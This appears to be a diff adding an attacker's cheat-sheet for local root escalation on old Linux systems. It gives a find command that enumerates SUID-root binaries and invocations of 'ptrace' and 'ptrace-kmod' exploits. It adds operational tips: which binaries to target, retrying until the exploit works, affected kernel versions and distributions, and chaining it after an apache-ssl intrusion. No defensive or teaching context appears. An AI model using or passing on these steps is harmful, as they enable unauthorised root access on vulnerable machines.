@@ -1,0 +1,15 @@
+
+find / -fstype nfs -prune -o -type f \( -perm -4000 \) -user root -ls > o
+#get o
+
+./ptrace <new vulnerable SUID root program>
+
+#trying running it at least 5 times.
+#pick a non-cached binary. passwd is bad. cardctl is good
+
+#new exploit is ptrace-kmod
+#it's a kernel exploit, no suid needed.
+#works on linux 2.2 -> 2.4, ex) RH8.0 and MDK 9.0
+#again, you might have to run it twice before it works.
+./ptrace-kmod
+#it's been tested through the apache-ssl exploit.
